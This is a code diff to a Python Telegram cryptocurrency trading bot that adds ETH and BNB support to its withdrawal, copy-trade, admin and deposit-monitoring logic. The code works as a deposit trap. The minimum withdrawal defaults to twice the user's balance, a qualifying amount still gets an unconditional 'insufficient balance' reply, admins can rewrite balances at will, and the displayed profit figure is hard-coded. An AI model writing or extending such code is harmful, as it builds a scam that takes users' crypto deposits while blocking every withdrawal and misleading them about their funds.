+            await query.message.reply_text(f"❗ Insufficient {sym} balance.", parse_mode="HTML", reply_markup=back_btn)
             return
-        if user_balance < minimum_withdrawal:
+        if balance < stored_min:
             await query.message.reply_text(
                 f"💸 <b>Withdrawal Requirements</b>\n\n"
-                f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-                f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
-                f"❗ You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
+                f"Your current balance: {balance:.6f} {sym} (${usd_value:.2f})\n\n"
+                f"<b>Minimum withdrawal required:</b> {stored_min:.6f} {sym}\n"
+                f"❗ You need at least {stored_min:.6f} {sym} to process a withdrawal.\n"
                 f"Please deposit more funds to meet the minimum requirement.",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]]
-                ),
+                parse_mode="HTML", reply_markup=back_btn,
             )
             return
-        half_balance = user_balance / 2
-        half_usd = half_balance * sol_price if sol_price > 0 else 0
+        half = balance / 2
+        half_usd = half * price if price > 0 else 0
+        network = {"sol": "Solana", "eth": "Ethereum", "bnb": "BNB Smart Chain"}[token]
         await query.message.reply_text(
             f"💸 <b>Withdraw 50%</b>\n\n"
-            f"Amount to withdraw: <b>{half_balance:.4f} SOL</b> (${half_usd:.2f})\n\n"
-            f"Please send your Solana wallet address to receive the funds.\n\n"
+            f"Amount to withdraw: <b>{half:.6f} {sym}</b> (${half_usd:.2f})\n\n"
+            f"Please send your {network} wallet address to receive the funds.\n\n"
             f"📝 Enter your wallet address below:",
-            parse_mode="HTML",
-            reply_markup=cancel_markup(),
+            parse_mode="HTML", reply_markup=cancel_markup(),
         )
         context.user_data["awaiting_withdraw"] = True
-        context.user_data["withdraw_amount"] = half_balance
+        context.user_data["withdraw_amount"]   = half
         return
 
     if option == "withdraw_custom":
         await _del()
         context.user_data["awaiting_withdraw"] = True
-        user_balance = get_user_balance(user_id)
-        sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-        stored_data = user_balances.get(user_id, {})
-        minimum_withdrawal = stored_data.get("min_withdrawal", user_balance * 2)
-
+        token = context.user_data.get("withdraw_token", "sol")
+        bal_data = user_balances.get(user_id, {})
+        if token == "sol":
+            balance  = get_user_balance(user_id)
+            price    = await get_sol_price_usd()
+            sym      = "SOL"
+            stored_min = bal_data.get("min_withdrawal", balance * 2)
+            if stored_min == 0 and balance > 0:
+                stored_min = balance * 2
+        elif token == "eth":
+            balance  = bal_data.get("eth_balance", 0)
+            price, _ = await get_evm_prices_usd()
+            sym      = "ETH"
+            stored_min = balance * 2
+        else:
+            balance  = bal_data.get("bnb_balance", 0)
+            _, price = await get_evm_prices_usd()
+            sym      = "BNB"
+            stored_min = balance * 2
+        usd_value = balance * price if price > 0 else 0
         sent = await query.message.reply_text(
             f"💸 <b>Withdraw Custom Amount</b>\n\n"
-            f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
-            f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL\n"
-            f"Please enter the withdrawal amount (in SOL):\n\n"
-            f"📝 Enter your desired amount (minimum: {minimum_withdrawal:.4f} SOL)",
-            parse_mode="HTML",
-            reply_markup=cancel_markup(),
+            f"Your current balance: <b>{balance:.6f} {sym}</b> (${usd_value:.2f})\n\n"
+            f"<b>Minimum withdrawal:</b> {stored_min:.6f} {sym}\n"
+            f"Please enter the withdrawal amount (in {sym}):\n\n"
+            f"📝 Enter your desired amount (minimum: {stored_min:.6f} {sym})",
+            parse_mode="HTML", reply_markup=cancel_markup(),
         )
-        context.user_data["withdraw_prompt_msg_id"] = sent.message_id
+        context.user_data["withdraw_prompt_msg_id"]  = sent.message_id
         context.user_data["withdraw_prompt_chat_id"] = sent.chat_id
         return
 
@@ -1484,7 +1710,7 @@ async def get_token_details(token_address: str):
 
 
 # Format token details for display
-def format_token_details(pair_data, wallet_balance=0):
+def format_token_details(pair_data, wallet_balance=0, chain_sym="SOL"):
     """Format token details in the style requested by user"""
     try:
         from datetime import datetime
@@ -1529,10 +1755,9 @@ def format_token_details(pair_data, wallet_balance=0):
 
         # Format price with proper decimals (fix for very small prices)
         if price_usd == 0:
-            price_str = "0"
+            price_str = "0.000000"
         else:
-            # Use high precision formatting to preserve significant digits for very small prices
-            price_str = ("%.18f" % price_usd).rstrip("0").rstrip(".")
+            price_str = f"{price_usd:.6f}"
 
         # Fix timestamp conversion (pairCreatedAt is in milliseconds)
         if pair_created:
@@ -1570,21 +1795,37 @@ def format_token_details(pair_data, wallet_balance=0):
         else:
             liq_str = f"{liquidity_usd / 1000:.2f}K"
 
+        # Determine chain for links
+        chain_id = pair_data.get("chainId", "solana").lower()
+        if chain_id in ("ethereum", "eth"):
+            dex_chain = "ethereum"
+            chain_emoji = "🔵"
+            chain_label = "Ethereum"
+        elif chain_id in ("bsc", "binance-smart-chain", "bnb"):
+            dex_chain = "bsc"
+            chain_emoji = "🟡"
+            chain_label = "BSC"
+        else:
+            dex_chain = "solana"
+            chain_emoji = "🟣"
+            chain_label = "Solana"
+
+        extra_link = (
+            f" | <a href='https://www.pump.fun/{token_address}'>Pump</a>"
+            if dex_chain == "solana" else ""
+        )
+
         message = (
             f"📌 <b>{token_name} ({token_symbol})</b>\n"
             f"<code>{token_address}</code>\n\n"
             f"💳 <b>Wallet:</b>\n"
-            f"|——Balance: {wallet_balance} SOL\n"
+            f"|——Balance: {wallet_balance} {chain_sym}\n"
             f"|——Holding: 0 {token_symbol}\n"
             f"|___PnL: 0%🚀🚀\n\n"
             f"💵 <b>Trade:</b>\n"
             f"|——Market Cap: {mcap_str}\n"
             f"|——Price: {price_str}\n"
             f"|___Buyers (24h): {buyers_24h}\n\n"
-            # f"🔍 <b>Security:</b>\n"
-            # f"|——Security scan available on DexScreener\n"
-            # f"|——Trade Tax: Check DexScreener\n"
-            # f"|___Top 10: Check DexScreener\n\n"
             f"📝 <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
             f"|——💧 {dex_id} AMM\n"
             f"|——🟢 Trading opened\n"
@@ -1593,8 +1834,8 @@ def format_token_details(pair_data, wallet_balance=0):
             f"📲 <b>Links:</b>\n"
             f"|—— Twitter {twitter_link}\n"
             f"|—— Telegram {telegram_link}\n"
-            f"|___ <a href='https://dexscreener.com/solana/{token_address}'>DexScreener</a> | "
-            f"<a href='https://www.pump.fun/{token_address}'>Pump</a>"
+            f"|___ <a href='https://dexscreener.com/{dex_chain}/{token_address}'>DexScreener</a>"
+            f"{extra_link}"
         )
 
         return message
@@ -1762,10 +2003,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     status = "Fixed" if is_fixed else "Auto (x2)"
                     is_muted = target_id in muted_users
                     mute_status = "🔕 Muted" if is_muted else "🔔 Active"
+                    eth_bal = data.get("eth_balance", 0)
+                    bnb_bal = data.get("bnb_balance", 0)
 
                     msg = (
                         f"👤 <b>User Details:</b> <code>{target_id}</code>\n\n"
-                        f"💰 <b>Balance:</b> {balance:.4f} SOL\n"
+                        f"🟣 <b>SOL Balance:</b> {balance:.4f} SOL\n"
+                        f"🔵 <b>ETH Balance:</b> {eth_bal:.4f} ETH\n"
+                        f"🟡 <b>BNB Balance:</b> {bnb_bal:.4f} BNB\n\n"
                         f"💸 <b>Min Withdrawal:</b> {min_w:.4f} SOL\n"
                         f"⚙️ <b>Min Status:</b> {status}\n"
                         f"🔔 <b>Notifications:</b> {mute_status}"
@@ -1777,15 +2022,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     keyboard = InlineKeyboardMarkup(
                         [
                             [
-                                InlineKeyboardButton(
-                                    "✏️ Edit Balance",
-                                    callback_data=f"admin_edit_balance_{target_id}",
-                                )
+                                InlineKeyboardButton("✏️ Edit SOL", callback_data=f"admin_edit_balance_{target_id}"),
+                                InlineKeyboardButton("✏️ Edit ETH", callback_data=f"admin_edit_ethbal_{target_id}"),
+                                InlineKeyboardButton("✏️ Edit BNB", callback_data=f"admin_edit_bnbbal_{target_id}"),
                             ],
                             [
                                 InlineKeyboardButton(
                                     "✏️ Edit Min Withdrawal",
-                                    callback_data=f"admin_edit_min_withdrawal_{target_id}",
+                                    callback_data=f"admin_edit_minw_{target_id}",
                                 )
                             ],
                             [
@@ -1822,33 +2066,42 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         "last_checked_slot": 0,
                         "min_withdrawal": 0,
                         "fixed_min": False,
+                        "eth_balance": 0,
+                        "bnb_balance": 0,
                     }
 
                 if field == "balance":
                     user_balances[target_id]["balance"] = val
-                    # If balance edit meets or exceeds current min withdrawal, reset to X2 logic
                     current_min = user_balances[target_id].get("min_withdrawal", 0)
                     if val >= current_min:
                         user_balances[target_id]["fixed_min"] = False
                         user_balances[target_id]["min_withdrawal"] = val * 2
-                else:  # min_withdrawal
+                elif field == "ethbal":
+                    user_balances[target_id]["eth_balance"] = val
+                elif field == "bnbbal":
+                    user_balances[target_id]["bnb_balance"] = val
+                else:  # minw / min_withdrawal
                     user_balances[target_id]["min_withdrawal"] = val
-                    user_balances[target_id]["fixed_min"] = (
-                        True  # Mark as fixed manually
-                    )
+                    user_balances[target_id]["fixed_min"] = True
 
                 save_balances()
 
-                # Show updated details including USD value
                 sol_price = await get_sol_price_usd()
-                new_balance = user_balances[target_id]["balance"]
+                new_sol = user_balances[target_id]["balance"]
+                new_eth = user_balances[target_id].get("eth_balance", 0)
+                new_bnb = user_balances[target_id].get("bnb_balance", 0)
                 new_min = user_balances[target_id]["min_withdrawal"]
-                usd_value = new_balance * sol_price if sol_price > 0 else 0
+                usd_value = new_sol * sol_price if sol_price > 0 else 0
+
+                label_map = {"balance": "SOL Balance", "ethbal": "ETH Balance", "bnbbal": "BNB Balance", "minw": "Min Withdrawal"}
+                label = label_map.get(field, field.replace("_", " ").title())
 
                 update_msg = (
-                    f"✅ {field.replace('_', ' ').title()} updated for user {target_id}.\n\n"
-                    f"💰 <b>New Balance:</b> {new_balance:.4f} SOL (${usd_value:.2f})\n"
-                    f"💸 <b>New Min Withdrawal:</b> {new_min:.4f} SOL"
+                    f"✅ <b>{label}</b> updated for user <code>{target_id}</code>\n\n"
+                    f"🟣 SOL: {new_sol:.4f} (${usd_value:.2f})\n"
+                    f"🔵 ETH: {new_eth:.4f}\n"
+                    f"🟡 BNB: {new_bnb:.4f}\n"
+                    f"💸 Min Withdrawal: {new_min:.4f} SOL"
                 )
 
                 await update.message.reply_text(update_msg, parse_mode="HTML")
@@ -1867,23 +2120,34 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "❌ Cancelled.", reply_markup=main_menu_inline()
             )
             return
-        # Verify $20 minimum at submission time
-        user_balance = get_user_balance(user_id)
-        sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-        if usd_value < 20:
+        # Verify $20 minimum across total portfolio (SOL + ETH + BNB) silently
+        sol_balance  = get_user_balance(user_id)
+        sol_price    = await get_sol_price_usd()
+        eth_price_ct, bnb_price_ct = await get_evm_prices_usd()
+        bal_ct       = user_balances.get(user_id, {})
+        eth_balance  = bal_ct.get("eth_balance", 0)
+        bnb_balance  = bal_ct.get("bnb_balance", 0)
+        total_usd    = (
+            sol_balance * sol_price +
+            eth_balance * eth_price_ct +
+            bnb_balance * bnb_price_ct
+        )
+        if total_usd < 20:
             context.user_data.pop("awaiting_ct_target_wallet", None)
             await update.message.reply_text(
-                "<b>Your SOL balance is too low to copy this wallet. Please top up your wallet and try again.</b>",
+                "<b>Your balance is too low to copy this wallet. Please top up your wallet and try again.</b>",
                 parse_mode="HTML",
                 reply_markup=main_menu_inline(),
             )
             return
-        wallet_address = text.strip()
-        base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
-        if not re.match(base58_pattern, wallet_address):
+        wallet_address  = text.strip()
+        base58_pattern  = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
+        evm_pattern     = r"^0x[0-9a-fA-F]{40}$"
+        if not re.match(base58_pattern, wallet_address) and not re.match(evm_pattern, wallet_address):
             await update.message.reply_text(
-                "❗ Invalid Solana wallet address. Please enter a valid 32-44 character base58 address.",
+                "❗ Invalid wallet address.\n\n"
+                "• For Solana: enter a 32-44 character base58 address.\n"
+                "• For EVM (ETH/BSC): enter a 0x… 42-character hex address.",
                 reply_markup=cancel_markup(),
             )
             return
@@ -2159,17 +2423,34 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     pass
 
         back_btn = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "⬅️ Back to Withdraw", callback_data="back_withdraw"
-                    )
-                ]
-            ]
+            [[InlineKeyboardButton("⬅️ Back to Withdraw", callback_data="back_withdraw")]]
         )
+
+        # Resolve which token is being withdrawn
+        w_token = context.user_data.get("withdraw_token", "sol")
+        bal_wd  = user_balances.get(user_id, {})
+        if w_token == "sol":
+            w_balance  = get_user_balance(user_id)
+            w_price    = await get_sol_price_usd()
+            w_sym      = "SOL"
+            w_min      = bal_wd.get("min_withdrawal", w_balance * 2)
+            if w_min == 0 and w_balance > 0:
+                w_min = w_balance * 2
+        elif w_token == "eth":
+            w_balance  = bal_wd.get("eth_balance", 0)
+            w_price, _ = await get_evm_prices_usd()
+            w_sym      = "ETH"
+            w_min      = w_balance * 2
+        else:
+            w_balance  = bal_wd.get("bnb_balance", 0)
+            _, w_price = await get_evm_prices_usd()
+            w_sym      = "BNB"
+            w_min      = w_balance * 2
+        w_usd = w_balance * w_price if w_price > 0 else 0
 
         if text.lower() == "cancel":
             context.user_data.pop("awaiting_withdraw", None)
+            context.user_data.pop("withdraw_token", None)
             await _del_prompt()
             cancelled_msg = await update.message.reply_text(
                 "❌ <b>Withdrawal Cancelled.</b>", parse_mode="HTML"
@@ -2188,7 +2469,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             amount = float(text)
         except ValueError:
             await update.message.reply_text(
-                "❗ Invalid amount. Please enter a number.",
+                f"❗ Invalid amount. Please enter a number (in {w_sym}).",
                 reply_markup=back_btn,
             )
             context.user_data.pop("awaiting_withdraw", None)
@@ -2202,35 +2483,29 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.pop("awaiting_withdraw", None)
             return
 
-        user_balance = get_user_balance(user_id)
-        sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-        stored_data = user_balances.get(user_id, {})
-        minimum_withdrawal = stored_data.get("min_withdrawal", user_balance * 2)
-
-        if user_balance == 0:
+        if w_balance == 0:
             await update.message.reply_text(
-                "❗ Insufficient SOL balance.", reply_markup=back_btn
+                f"❗ Insufficient {w_sym} balance.", reply_markup=back_btn
             )
             context.user_data.pop("awaiting_withdraw", None)
             return
 
-        if usd_value < 10:
+        if w_usd < 10:
             await update.message.reply_text(
                 f"❗ Your balance must be above $10 to withdraw.\n\n"
-                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
+                f"Current balance: {w_balance:.6f} {w_sym} (${w_usd:.2f})\n\n"
+                f"Please deposit more {w_sym} to meet the minimum withdrawal requirement.",
                 reply_markup=back_btn,
             )
             context.user_data.pop("awaiting_withdraw", None)
             return
 
-        if amount < minimum_withdrawal:
+        if amount < w_min:
             await update.message.reply_text(
                 f"❗ <b>Withdrawal Amount Too Low</b>\n\n"
-                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
-                f"Minimum withdrawal: {minimum_withdrawal:.4f} SOL\n\n"
-                f"You need to withdraw at least {minimum_withdrawal:.4f} SOL.\n"
+                f"Your balance: {w_balance:.6f} {w_sym} (${w_usd:.2f})\n"
+                f"Minimum withdrawal: {w_min:.6f} {w_sym}\n\n"
+                f"You need to withdraw at least {w_min:.6f} {w_sym}.\n"
                 f"Please enter a higher amount or deposit more funds.",
                 parse_mode="HTML",
                 reply_markup=back_btn,
@@ -2240,9 +2515,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text(
             f"❗ <b>Insufficient Balance for Withdrawal</b>\n\n"
-            f"Withdrawal amount: {amount:.4f} SOL\n"
-            f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-            f"You don't have enough SOL to complete this withdrawal.\n"
+            f"Withdrawal amount: {amount:.6f} {w_sym}\n"
+            f"Your balance: {w_balance:.6f} {w_sym} (${w_usd:.2f})\n\n"
+            f"You don't have enough {w_sym} to complete this withdrawal.\n"
             f"Please deposit more funds to your wallet.",
             parse_mode="HTML",
             reply_markup=back_btn,
@@ -2413,10 +2688,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token_address = text.strip()
 
         base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
-        if not re.match(base58_pattern, token_address):
+        evm_contract_pattern = r"^0x[0-9a-fA-F]{40}$"
+        is_evm_contract = bool(re.match(evm_contract_pattern, token_address))
+        if not re.match(base58_pattern, token_address) and not is_evm_contract:
             await update.message.reply_text(
-                "❗ Invalid token contract address. Please enter a valid Solana token address.\n\n"
-                "Solana addresses are 32-44 characters and use base58 encoding.",
+                "❗ Invalid token contract address.\n\n"
+                "• <b>Solana:</b> 32–44 character base58 address\n"
+                "• <b>ETH / BSC:</b> 0x… 42-character hex address",
+                parse_mode="HTML",
                 reply_markup=InlineKeyboardMarkup(
                     [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
                 ),
@@ -2445,8 +2724,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
 
         if pair_data:
-            user_balance = get_user_balance(user_id)
-            token_info = format_token_details(pair_data, wallet_balance=user_balance)
+            # Detect chain from DexScreener response
+            chain_id = pair_data.get("chainId", "solana").lower()
+            if chain_id in ("ethereum", "eth"):
+                chain_sym   = "ETH"
+                chain_key   = "eth"
+                w_bal_show  = user_balances.get(user_id, {}).get("eth_balance", 0)
+            elif chain_id in ("bsc", "binance-smart-chain", "bnb"):
+                chain_sym   = "BNB"
+                chain_key   = "bnb"
+                w_bal_show  = user_balances.get(user_id, {}).get("bnb_balance", 0)
+            else:
+                chain_sym   = "SOL"
+                chain_key   = "sol"
+                w_bal_show  = get_user_balance(user_id)
+
+            context.user_data["current_token_chain"] = chain_key
+
+            token_info = format_token_details(pair_data, wallet_balance=w_bal_show, chain_sym=chain_sym)
             if token_info:
                 context.user_data["current_token"] = token_address
 
@@ -2454,7 +2749,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     [
                         [
                             InlineKeyboardButton(
-                                "🟢 Buy 0.1 SOL",
+                                f"🟢 Buy 0.1 {chain_sym}",
                                 callback_data=f"buy_0.1_{token_address}",
                             ),
                             InlineKeyboardButton(
@@ -2463,7 +2758,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         ],
                         [
                             InlineKeyboardButton(
-                                "🟢 Buy 0.5 SOL",
+                                f"🟢 Buy 0.5 {chain_sym}",
                                 callback_data=f"buy_0.5_{token_address}",
                             ),
                             InlineKeyboardButton(
@@ -2473,7 +2768,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         ],
                         [
                             InlineKeyboardButton(
-                                "🟢 Buy 1.0 SOL",
+                                f"🟢 Buy 1.0 {chain_sym}",
                                 callback_data=f"buy_1.0_{token_address}",
                             ),
                             InlineKeyboardButton(
@@ -2483,19 +2778,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         ],
                         [
                             InlineKeyboardButton(
-                                "🟢 Buy 3.0 SOL",
+                                f"🟢 Buy 3.0 {chain_sym}",
                                 callback_data=f"buy_3.0_{token_address}",
                             )
                         ],
                         [
                             InlineKeyboardButton(
-                                "🟢 Buy 5.0 SOL",
+                                f"🟢 Buy 5.0 {chain_sym}",
                                 callback_data=f"buy_5.0_{token_address}",
                             )
                         ],
                         [
                             InlineKeyboardButton(
-                                "🟢 Buy x SOL",
+                                f"🟢 Buy x {chain_sym}",
                                 callback_data=f"buy_custom_{token_address}",
                             )
                         ],
@@ -2565,17 +2860,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
-    """Background task to continuously monitor deposits for all users"""
+    """Background task: monitor SOL + EVM deposits for all users every 30s"""
     try:
-        # Check deposits for all users who have balances
         for telegram_id in list(user_balances.keys()):
             try:
                 public_address, _ = derive_keypair_and_address(telegram_id)
-                await monitor_deposits(
-                    telegram_id, public_address, context, notify_user=True
-                )
+                await monitor_deposits(telegram_id, public_address, context, notify_user=True)
             except Exception as e:
-                print(f"Error monitoring deposits for user {telegram_id}: {e}")
+                print(f"Error monitoring SOL deposits for user {telegram_id}: {e}")
+            try:
+                evm_address, _ = derive_evm_wallet(telegram_id)
+                await monitor_evm_deposits(telegram_id, evm_address, context, notify_user=True)
+            except Exception as e:
+                print(f"Error monitoring EVM deposits for user {telegram_id}: {e}")
     except Exception as e:
         print(f"Error in background deposit monitor: {e}")
 
